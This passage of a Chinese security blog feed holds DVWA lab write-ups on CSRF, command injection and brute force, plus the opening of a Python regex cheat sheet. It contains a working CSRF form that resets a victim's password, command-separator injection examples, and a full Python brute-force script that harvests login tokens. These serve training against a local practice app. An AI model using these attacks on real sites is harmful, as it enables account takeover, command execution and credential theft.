服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</p></li></ol><p>这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p><p>注意：</p><p>CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。所以XSS带来的问题，应该使用XSS的防御方案予以解决。</p><p>经过不断尝试后，发现High等级是用了检查Refer来预防CSRF，那我们是否可以构造和目标网站相同的Refer来进行攻击呢？</p><blockquote><p>不了解http头中Refer作用的可以先去百度下</p></blockquote><p>我这里是写了一个html网页并将其放在了服务器的一个名为<code>127.0.0.1</code>的目录下，这样访问的时候Refer字段中就会存在127.0.0.1，从而骗过了后端代码的验证。</p><p>html代码如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>美女图片，点击下方按钮查看<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/dvwa/vulnerabilities/csrf/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password_new<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password_conf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>查看<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证是否可以修改密码，将此链接发给受害者，诱导他点击。</p><p>抓包看到，Refer中已经包含了<code>127.0.0.1</code></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427132728.png" alt="20190427132728.png"></p><p>密码也成功修改：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427132759.png" alt="20190427132759.png"></p><p>可以看到Medium等级的CSRF只要请求头中的Refer包含了Host就可以攻击成功，查看源码也是如此：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427132943.png" alt="20190427132943.png"></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>使用前面的方法去尝试，发现都不可用，提示<code>CSRF token is incorrect</code></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427133209.png" alt="20190427133209.png"></p><p>抓包可发现，此次修改密码时需要添加token字段：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427133416.png" alt="20190427133416.png"></p><p>token字段是不断变化的，不知道此字段的情况下是无法修改密码的，High等级的CSRF攻击需要配合后面的XSS漏洞一起，这里就先不做介绍，等XSS漏洞时一起介绍。</p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>Impossible等级修改密码时需要先输入当前密码。这一措施使得CSRF攻击无法进行。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427134058.png" alt="20190427134058.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA命令注入(Command Injection)</title>
      <link href="2019/04/24/dvwa-command-injection/"/>
      <url>2019/04/24/dvwa-command-injection/</url>
      
        <content type="html"><![CDATA[<p>命令执行是指代码直接执行系统命令， 而我们可以利用windows或者linux下的命令拼接来达到执行另外的命令，这就是命令注入。</p><p>在命令执行中，常用的命令连接符号有四个：</p><ul><li><code>&amp;&amp;</code>:前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样</li><li><code>||</code>:前一个命令执行失败，后面的才继续执行，类似于或操作</li><li><code>&amp;</code>：直接连接多个命令</li><li><code>|</code>：管道符，将前一个命令的输出作为下一个命令的输入</li><li><code>;</code>：直接连接多个命令</li></ul><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>在DVWA的low等级中，代码完全没有过滤任何参数，直接去执行了系统命令，代码如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190424231902.png" alt="20190424231902.png"></p><p>所以我们可以进行简单的命令拼接就可以达到目的：</p><p>在windows下可以使用<code>&amp;&amp;</code>或者<code>&amp;</code>进行命令拼接，在linux下可以使用<code>;</code>或者<code>&amp;&amp;</code>进行命令拼接。</p><p>进行尝试：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190424232432.png" alt="20190424232432.png"></p><p>可看到<code>net user</code>命令被正确执行。</p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>Medium等级下，先尝试用<code>&amp;&amp;</code>做命令拼接。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190425212427.png" alt="20190425212427.png"></p><p>提示错误的参数，说明代码已经对输入的拼接做了过滤。再尝试用<code>&amp;</code>拼接。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190425212623.png" alt="20190425212623.png"></p><p>命令执行成功，产看源代码发现只对<code>&amp;&amp;</code>和<code>;</code>做了过滤：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190425212721.png" alt="20190425212721.png"></p><h2 id="Hight等级"><a href="#Hight等级" class="headerlink" title="Hight等级"></a>Hight等级</h2><p>High等级下，尝试用<code>&amp;&amp;</code>和<code>&amp;</code>都会提示错误参数，再使用<code>|</code>和<code>||</code>尝试，发现<code>|</code>可以正常执行命令，查看代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190425213234.png" alt="20190425213234.png"></p><p>代码已经将可能用到的命令拼接符号全部做了过滤，但是为什么<code>|</code>可以呢，仔细观察发现<code>|</code>后面有个空格，这就是编码的不细心导致的命令执行。</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible等级使用了白名单的方式去检查我们的输入，它会将用户输入的数字用<code>.</code>分割，然后再重新拼接成IP地址，这就使得用户输入的其他参数是无效的。关键代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// Get input</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Split the IP into 4 octects</span><span class="token variable">$octet</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check IF each octet is an integer</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token function">sizeof</span><span class="token punctuation">(</span> <span class="token variable">$octet</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// If all 4 octets are int's put the IP back together.</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$octet</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA暴力破解(Brute Force)</title>
      <link href="2019/04/21/dvwa-brute-force/"/>
      <url>2019/04/21/dvwa-brute-force/</url>
      
        <content type="html"><![CDATA[<p>暴力破解通常是用手工或者工具的方法对一个网站的登陆页面不断尝试各种用户名和密码的组合，直到能试出正确的一个组合。</p><p>DVWA的暴力破解难度等级分为四个 ：</p><ul><li>LOW：这一等级并没有对暴力破解做任何的防护，只需不断尝试即可破解。</li><li>Medium: 这一等级是在LOW的基础上做了一点防护，当用户名和密码输错后会让用户在两秒后才能进行下一步的尝试。</li><li>High:这一等级相比前两个等级有了较大的难度，在每次登陆时会带一个token字段发送到服务器端，服务器端会验证用户名，密码和token是否正确，正确才能登陆。token字段是随机生成的，当不了解使用何种算法生成token时是不能进行暴力破解的。</li><li>Impossible: 这一等级DVWA在连续三次输错用户名和密码后会锁定15分钟，15分钟后才能尝试。这样的设定就无法进行暴力破解了。</li></ul><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p><strong>暴力破解需要一本好的字典，字典越有针对性，破解过程越快。</strong><br>这里我们只是为了演示，就随便做了一个用户名的字典，一个密码的字典，字典内容如下：</p><p>用户名字典：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adminuseradmin123rootroot123administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>密码字典：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">123456rootadmin123passwordqwertyabcd1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="LOW等级暴力破解"><a href="#LOW等级暴力破解" class="headerlink" title="LOW等级暴力破解"></a>LOW等级暴力破解</h2><p>low等级的暴力破解比较简单，可以使用手工的方法在登陆页面不断进行尝试，但是这种方法用时会很长，这里我用用到了一款工具ZAP。</p><blockquote><p>OWASP Zed攻击代理（ZAP）是世界上最受欢迎的免费安全审计工具之一，由数百名国际志愿者积极维护。它可以帮助你在开发和测试应用程序时自动查找Web应用程序中的安全漏洞。<br>也可以说ZAP是一个中间人代理。它能够获取你对Web应用程序发出的所有请求以及你从中收到的所有响应。</p></blockquote><p>ZAP的安装过程省略，提供一个ZAP的下载地址：<a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project</a></p><h3 id="设置浏览器代理"><a href="#设置浏览器代理" class="headerlink" title="设置浏览器代理"></a>设置浏览器代理</h3><p>将其设置为ZAP所监听的端口，我设置的ZAP的端口为6666（默认端口为8080）。<br>所以需要设置浏览器的代理为：127.0.0.1:6666</p><p>浏览器端的设置代理的工具有很多，我用的是火狐浏览器，所用代理工具为“simpleProxy”。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190421213421.png" alt="20190421213421.png"></p><p>设置好代理后，浏览器端的所有请求和响应都会被ZAP所捕捉到。</p><h3 id="捕捉并分析请求"><a href="#捕捉并分析请求" class="headerlink" title="捕捉并分析请求"></a>捕捉并分析请求</h3><p>在DVWA上随便输入一个用户名和密码，点击登陆，然后在ZAP上查看捕捉到的数据包。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190421215720.png" alt="20190421215720.png"></p><p>分析捕获到的请求数据报头，发现报头中会携带用户名和密码发送到服务器端，然后服务器端判断是否正确。此时我们就可以在ZAP上不断修改用户名和密码发送到服务器端，然后根据响应结果判断用户名密码是否正确。<br>ZAP提供的Fuzzer功能可以按照我们提供的字典修改请求头中的参数重复发送到服务器端。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190421220715.png" alt="20190421220715.png"></p><p>参数设置好后就可以开始爆破了。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190421221327.png" alt="20190421221327.png"></p><h3 id="分析服务器返回的数据"><a href="#分析服务器返回的数据" class="headerlink" title="分析服务器返回的数据"></a>分析服务器返回的数据</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190421222034.png" alt="20190421222034.png"></p><p>分析数据包发现有一个数据返回的Body大小和其它的都不一样，于是怀疑这条数据是登陆成功后返回的，其它的都是登陆失败后返回的。毕竟正确的用户名和密码只有一个。<br>于是将此用户名和密码输入到DVWA上发现登陆成功。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190421223450.png" alt="20190421223450.png"></p><h2 id="Medium等级暴力破解"><a href="#Medium等级暴力破解" class="headerlink" title="Medium等级暴力破解"></a>Medium等级暴力破解</h2><p>Medium等级的暴力破解和LOW等级的暴力破解方法相同，只不过破解时间会变慢。在DVWA上查看源代码发现，每当输入错误的密码后，就会等待0-3秒才能进行下一次登陆。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Get users details</span>        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// Login successful</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Welcome to the password protected area <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token punctuation">&#125;</span></span>&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$avatar</span><span class="token punctuation">&#125;</span></span>\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Login failed</span>        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此种方法只会延长暴力破解的时间，并不能阻止暴力破解。</p><h2 id="Hight等级暴力破解"><a href="#Hight等级暴力破解" class="headerlink" title="Hight等级暴力破解"></a>Hight等级暴力破解</h2><p>和LOW等级一样，我们抓取Hight等级的请求数据包进行观察。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190422000439.png" alt="20190422000439.png"></p><p>发现这个请求头比LOW等级的多了一个user_token参数，而且每次请求的user_token参数都是不同的。</p><p>我们必须找出这个user_token的值是从哪里来的，规律是什么才能进行下一步的暴力破解。<br>通过观察，我们发现在前端的HTML代码中，登陆框的form表单中有一个隐藏的input。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190422001159.png" alt="20190422001159.png"></p><p>发现每次请求都会带上其中的value值进行发送，不断刷新网页，又发现这个value值是不断变化的。在不知道源码的情况下是无法推算出此value值的计算方法的。</p><p>这里我写一段python代码来进行破解，思路大概是每次登陆前先获取HTNL代码中的value值然后放入header头中去请求服务器，直到成功为止。也可以使用burpsuit进行破解，过程请参考：<br><a href="https://blog.csdn.net/liweibin812/article/details/86287645">https://blog.csdn.net/liweibin812/article/details/86287645</a></p><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> sys<span class="token comment">#DVWA High等级暴力破解</span><span class="token comment">#获取user_token值</span>header<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://127.0.0.1/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">,</span>    <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'security=high; PHPSESSID=mtsel2kcb1a4uecf6b7e87aa23'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_user_token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 获取DVWA登陆页面</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    rsp <span class="token operator">=</span> r<span class="token punctuation">.</span>text    <span class="token comment"># 获取登陆表单中的value值</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>rsp<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span>    input_name <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>attrs<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'user_token'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    value <span class="token operator">=</span> input_name<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span>  value<span class="token comment">#读取用户名和密码字典</span>f1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'username.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>user_list <span class="token operator">=</span> f1<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>user_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> user_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'password.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>pass_list <span class="token operator">=</span> f2<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>pass_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pass_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> pass_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># value值即get请求头中的user_token</span><span class="token comment"># 开始组合请求头并发送到服务器</span><span class="token keyword">for</span> username <span class="token keyword">in</span> user_list<span class="token punctuation">:</span>    <span class="token keyword">for</span> password <span class="token keyword">in</span> pass_list<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span><span class="token string">'Login'</span><span class="token punctuation">:</span><span class="token string">'Login'</span><span class="token punctuation">,</span><span class="token string">'user_token'</span><span class="token punctuation">:</span>get_user_token<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>params<span class="token operator">=</span>payload<span class="token punctuation">)</span>        rsp <span class="token operator">=</span> r<span class="token punctuation">.</span>text        <span class="token comment">#判断是否登陆成功</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>rsp<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span>            error_text<span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>soup<span class="token punctuation">.</span>pre<span class="token punctuation">.</span>br<span class="token punctuation">.</span>string<span class="token punctuation">)</span>            error_text <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>error_text<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'incorrect'</span> <span class="token keyword">in</span> error_text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token operator">+</span><span class="token string">'  '</span><span class="token operator">+</span><span class="token string">'错误'</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token operator">+</span><span class="token string">'  '</span><span class="token operator">+</span><span class="token string">'正确'</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#找到正确密码就退出程序，不在往下执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python正则表达式总结</title>
      <link href="2019/04/02/Python-regex-summary/"/>
      <url>2019/04/02/Python-regex-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="常用匹配规则"><a href="#常用匹配规则" class="headerlink" title="常用匹配规则"></a>常用匹配规则</h2><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>\w</td><td>匹配字母、数字及下划线</td></tr><tr><td>\W</td><td>匹配不是字母、数字及下划线的字符</td></tr><tr><td>\s</td><td>匹配任意空白字符，等价于［\t\n\r\f]</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于［0-9]</td></tr><tr><td>\D</td><td>匹配任意非数字的字符</td></tr><tr><td>\A</td><td>匹配字符串开头</td></tr><tr><td>\Z</td><td>匹配字符串结尾，如果存在换行，只匹配到换行前的结束字符串</td></tr><tr><td>\z</td><td>匹配字符串结尾，如果存在换行，同时还会匹配换行符</td></tr><tr><td>\G</td><td>匹配最后匹配完成的位宣</td></tr><tr><td>\n</td><td>匹配一个换行符</td></tr><tr><td>\t</td><td>匹配一个制表符</td></tr><tr><td>^</td><td>匹配一行字符串的开头</td></tr><tr><td>$</td><td>匹配一行字符串的结尾</td></tr><tr><td>.</td><td>匹配任意字符，除了换行符，当re.DOTALL 标记被指定时，贝lj可以匹配包括换行符的任意字符</td></tr><tr><td>[ …]</td><td>用来表示一组字符，单独列出， 比如［ amk ］匹配a 、m 或k</td></tr><tr><td>[ ^…]</td><td>不在［］中的字符，比如（^abc ］匹配除了a 、b 、c 之外的字符</td></tr><tr><td>*</td><td>匹配0 个或多个表达式</td></tr><tr><td>+</td><td>匹配1 个或多个表达式</td></tr><tr><td>?</td><td>匹配0 个或l 个前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td>{n}</td><td>精确匹配n 个前面的表达式</td></tr><tr><td>{n,m}</td><td>匹配n 到m 次由前面正则表达式定义的片段，贪婪方式</td></tr><tr><td>a|b</td><td>匹配a 或b</td></tr><tr><td>( 